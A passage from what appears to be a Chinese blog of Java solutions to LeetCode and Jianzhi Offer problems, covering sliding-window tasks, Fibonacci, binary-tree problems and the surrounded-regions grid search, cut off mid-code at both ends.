class="line"></span><br><span class="line">            <span class="keyword">while</span> (count == tc.length) &#123;</span><br><span class="line">                c = sc[l];</span><br><span class="line">                <span class="keyword">if</span> (need[c] == <span class="number">0</span>) &#123;</span><br><span class="line">                    l++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (r - l &lt; min) &#123;</span><br><span class="line">                    min = r - l;</span><br><span class="line">                    start = l;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (have[c] == need[c]) &#123;</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;</span><br><span class="line">                have[c]--;</span><br><span class="line">                l++;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min == s.length() + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + min);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-59-II-队列的最大值"><a href="#剑指-Offer-59-II-队列的最大值" class="headerlink" title="剑指 Offer 59 - II. 队列的最大值"></a><a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/">剑指 Offer 59 - II. 队列的最大值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 队列可以看成是一个滑动窗口，入队就是将窗口的右边界右移，出队就是将窗口的左边界右移。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaxQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Deque&lt;Integer&gt; queue;</span><br><span class="line">    <span class="keyword">private</span> Deque&lt;Integer&gt; help;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MaxQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        help = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">max_value</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue.isEmpty() ? -<span class="number">1</span> : help.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        queue.offer(value);</span><br><span class="line">        <span class="keyword">while</span> (!help.isEmpty() &amp;&amp; value &gt; help.peekLast()) &#123;</span><br><span class="line">            help.pollLast();</span><br><span class="line">        &#125;</span><br><span class="line">        help.offer(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop_front</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (queue.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">        <span class="keyword">if</span> (val == help.peek()) &#123;</span><br><span class="line">            help.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-10-I-斐波那契数列"><a href="#剑指-Offer-10-I-斐波那契数列" class="headerlink" title="剑指 Offer 10- I. 斐波那契数列"></a><a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/">剑指 Offer 10- I. 斐波那契数列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>, q = <span class="number">1</span>, r;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            r = (p + q) % <span class="number">1000000007</span>;</span><br><span class="line">            p = q;</span><br><span class="line">            q = r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-57-II-和为s的连续正数序列"><a href="#剑指-Offer-57-II-和为s的连续正数序列" class="headerlink" title="剑指 Offer 57 - II. 和为s的连续正数序列"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/">剑指 Offer 57 - II. 和为s的连续正数序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] findContinuousSequence(<span class="type">int</span> target) &#123;</span><br><span class="line">        ArrayList&lt;<span class="type">int</span>[]&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> <span class="number">1</span>; r &lt; target; r++) &#123;</span><br><span class="line">            sum += r;</span><br><span class="line">            <span class="keyword">while</span> (sum &gt; target) &#123;</span><br><span class="line">                sum -= l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[r - l + <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tmp.length; i++) &#123;</span><br><span class="line">                    tmp[i] = l + i;</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[list.size()][];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            res[i] = list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="209-长度最小的子数组-x2F"><a href="#209-长度最小的子数组-x2F" class="headerlink" title=" 209. 长度最小的子数组&#x2F;"></a><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum"> 209. 长度最小的子数组</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>, min = nums.length + <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (r &lt; nums.length) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (r &lt; nums.length &amp;&amp; sum &lt; target ) &#123;</span><br><span class="line">                sum += nums[r];</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= target) &#123;</span><br><span class="line">                min = Math.min(min, r  - l);</span><br><span class="line">                sum -= nums[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min == nums.length + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="671-二叉树中第二小的节点"><a href="#671-二叉树中第二小的节点" class="headerlink" title="671. 二叉树中第二小的节点"></a><a href="https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/">671. 二叉树中第二小的节点</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="comment">// 递归找到比根结点大的值时可以立即返回.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findSecondMinimumValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> find(root, root.val);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">private</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (root.val &gt; val) &#123;</span><br><span class="line">        <span class="keyword">return</span> root.val;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> find(root.left, val);</span><br><span class="line">      <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> find(root.right, val);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(l &gt; val &amp;&amp; r &gt; val) &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.min(l, r);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> Math.max(l, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 后序遍历dfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root == p || root == q) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="235-二叉搜索树的最近公共祖先"><a href="#235-二叉搜索树的最近公共祖先" class="headerlink" title="235. 二叉搜索树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        lca(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lca</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((root.val - p.val) * (root.val - q.val) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            res = root;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123;</span><br><span class="line">            lca(root.right, p, q);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lca(root.left, p, q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="230-二叉搜索树中第K小的元素"><a href="#230-二叉搜索树中第K小的元素" class="headerlink" title="230. 二叉搜索树中第K小的元素"></a><a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/">230. 二叉搜索树中第K小的元素</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">			ArrayList&lt;Integer&gt; nums = inorder(root, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;());</span><br><span class="line">      <span class="keyword">return</span> nums.get(k-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  	</span><br><span class="line">  	<span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">inorder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; arr)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> arr;</span><br><span class="line">      inorder(root.left, arr);</span><br><span class="line">      arr.add(root.val);</span><br><span class="line">      inorder(root.right, arr);</span><br><span class="line">      <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 迭代</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">          <span class="keyword">while</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">              stack.push(root);</span><br><span class="line">              root = root.left;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          root = stack.pop();</span><br><span class="line">          k = k - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> (k == <span class="number">0</span>) <span class="keyword">return</span> root.val;</span><br><span class="line">          root = root.right;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124. 二叉树中的最大路径和"></a><a href="https://leetcode-cn.com/problems/binary-tree-maximum-path-sum/">124. 二叉树中的最大路径和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置一个全局变量res记录最大路径和</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       myMaxPathSum(root);</span><br><span class="line">       <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">myMaxPathSum</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> myMaxPathSum(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> myMaxPathSum(root.right);</span><br><span class="line">        <span class="keyword">if</span> (left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            left = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            right = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        max = Math.max(max, left + root.val + right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(root.val + left, root.val + right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中序为升序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">pre</span> <span class="operator">=</span> Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!isValidBST(root.left)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (root.val &lt;= pre) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        pre = root.val;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="130-被围绕的区域"><a href="#130-被围绕的区域" class="headerlink" title="130. 被围绕的区域"></a><a href="https://leetcode-cn.com/problems/surrounded-regions/">130. 被围绕的区域</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这时候的 O 是不做替换的。因为和边界是连通的。为了记录这种状态，我们把这种情况下的 O 换成 # 作为占位符，待搜索结束之后，遇到O 替换为 X（和边界不连通的O）；遇到 #，替换回 O(和边界连通的O)。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isEdge</span> <span class="operator">=</span> i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEdge &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    dfs(board, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || j &lt; <span class="number">0</span> || i &gt;= board.length || j &gt;= board[<span class="number">0</span>].length || board[i][j] == <span class="string">&#x27;X&#x27;</span> || board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        dfs(board, i - <span class="number">1</span>, j);</span><br><span class="line">        dfs(board, i + <span class="number">1</span>, j);</span><br><span class="line">        dfs(board, i, j - <span class="number">1</span>);</span><br><span class="line">        dfs(board, i, j + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 非递归的方式，我们需要记录每一次遍历过的位置，我们用 stack 来记录，因为它先进后出的特点。</span></span><br><span class="line"><span class="comment">// 而位置我们定义一个内部类 Pos 来标记横坐标和纵坐标。</span></span><br><span class="line"><span class="comment">// 注意的是，在写非递归的时候，我们每次查看 stack 顶，但是并不出 stack，直到这个位置上下左右都搜索不到的时候出 Stack。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pos</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        Pos(<span class="type">int</span> i, <span class="type">int</span> j) &#123;</span><br><span class="line">            <span class="built_in">this</span>.i = i;</span><br><span class="line">            <span class="built_in">this</span>.j = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.length;</span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isEdge</span> <span class="operator">=</span> i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEdge &amp;&amp; board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    dfs(board, i, j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        Stack&lt;Pos&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(i, j));</span><br><span class="line">        board[i][j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Pos</span> <span class="variable">current</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span> (current.i - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; board[current.i - <span class="number">1</span>][current.j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i - <span class="number">1</span>, current.j));</span><br><span class="line">                board[current.i - <span class="number">1</span>][current.j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.i + <span class="number">1</span> &lt; board.length &amp;&amp; board[current.i + <span class="number">1</span>][current.j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i + <span class="number">1</span>, current.j));</span><br><span class="line">                board[current.i + <span class="number">1</span>][current.j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.j - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; board[current.i][current.j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i, current.j - <span class="number">1</span>));</span><br><span class="line">                board[current.i][current.j - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.j + <span class="number">1</span> &lt;  board[<span class="number">0</span>].length &amp;&amp; board[current.i][current.j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i, current.j + <span class="number">1</span>));</span><br><span class="line">                board[current.i][current.j + <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            